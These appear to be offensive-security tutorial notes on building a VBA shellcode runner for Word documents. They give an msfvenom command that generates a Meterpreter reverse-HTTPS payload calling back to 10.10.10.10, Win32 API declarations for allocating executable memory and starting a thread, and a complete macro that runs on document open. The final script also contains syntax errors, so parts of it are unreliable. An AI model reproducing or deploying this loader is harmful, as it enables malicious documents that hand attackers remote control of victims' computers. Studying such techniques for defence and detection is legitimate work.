# Shellcode Runners
Code that will execute shellcode in memory.

## Steps
1. Use `VirtualAlloc` to create unmanaged memory that is r-w-x
2. Copy shellcode into new memory using `RtlMoveMemory`
3. Create new execution thread in the process using `CreateThread` to execute the shellcode.

Note: Allocating memory through other Win32 APIs return non-executable memory because of Data Execution Prevention.

## 1. VirtualAlloc
Create unmanaged memory that we can read, write, and execute:

| Param | Description |
| ----- | ----------- |
| `lpAddress` | Memory allocation address. If set to 0 the api will choose the location. |
| `dwSize` | Size of allocation |
| `flAllocationType` | Allocation type |
| `flProtect` | Memory protections |

```
LPVOID VirtualAlloc(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);
```

Create the following declaration:
- `LPVOID` can be translated to `LongPtr` 
```
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
```

## 2. Generate Shellcode
- System Architecture
- Must execute in word and formatted as `vbapplication`

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f vbapplication
```

After completion we'll see some output:
```
Payload size: 823 bytes
Final size of vbapplication file: 2740 bytes
buf = Array(252,72,131,228,240)
```

## 3. VBA Code
Create the VBA code:

| `Ubound` | Get the size of array |
| `&H3000` | `0x30000` equates to allocation type enums of `MEM_COMMIT` and `MEM_RESERVE` |
| `&H40` | Indicates that memory is readable, writeable, and executable | 

```
Dim buf As Variant
buf = Array (1,2,3)
addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
```

## 4. Copy Shellcode to memory location
Use [RtlMoveMemory](https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory)

| Variable | Translation | Passed By | Description |
| -------- | ----------- | --------- | ----------- | 
| `Destination` | `LongPtr` | `ByVal` | points to newly allocated memory pointer | 
| `Source` | `Any` | `ByRef` | Address of an element from the shellcode array |
| `Length` | `Long` | `ByVal` | Length of memory allocation |
| Return | `LongPtr` | - | - | Return value of function |

```sh
VOID RtlMoveMemory(
    VOID UNALIGNED *Destination,
    VOID UNALIGNED *Source,
    SIZE_T Length,
);
```

Delcaration Statement:

Note the argument prefixes are a coding convention and help determine the datatype / use at a glance
| Prefix | Purpose |
| ------ | ------- |
| `l` | `Long` Datatype which is a 32-bit signed integer. 64-bit when used with `LongPtr` |
| `s` | `String` In the case below it is due to the `Any` datatype |
| `p` | Used for pointers typically used in memory manipulation or API calls |

```sh
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource as Any, ByVal lLength As Long) As LongPtr
```

## 5. Build Loop
- Loop over the shellcode array and create a byte-by-byte copy of our payload.
- Use `LBound` and `UBound` to find first and last elements of array.

```sh
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Dim counter As Long
Dim data As Long
Dim res As LongPtr

For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
Next counter
```

## 6. Create Thread
Instructs the Os to create a new execution thread in a process. 
```sh
HANDLE CreateThread(
    LPSECRUITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);
```

| Variable | Translation | Passed By | Description |
| -------- | ----------- | --------- | ----------- | 
| `lpThreadAttributes` | `Long` | `ByVal` | Keep this as default 0 | 
| `dwStackSize` | `Long` | `ByVal` | Keep this as default 0|
| `lpStartAddress` | `LongPtr` | `ByRef` | Start address for code execution and must be the address of the shellcode buffer |
| `lpParameter` | `LongPtr` | `ByRef` | Pointer to arguments for code residing at the starting address. We have 0 arguments so 0 |
| `dwCreationFlags` | `Long` | `ByVal` | Control the creation of the thread |
| `lpThreadId` | `Long` | `ByRef` | A Pointer that receives the thread identifier |
| Return | `LongPtr` | - | Return value is a long pointer |

Delaration Statement:
```
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByRef StartAddress As LongPtr, ThreadParameter As LongPtr, ByVal CreationFlags As Long, ByRef ThreadId As Long) As LongPtr
```

## 7. Script
- Delare functions for 3 win32 apis
- Cretae space for shellcode
- Put our code in memory
- Create thread to execute code

```sh
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByValue dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function X()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter A Long
    Dim data As Long
    Dim res As LongPtr

    buf = Array(1,2,3)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    X
End Sub

Sub AutoOpen()
    X
End Sub
```
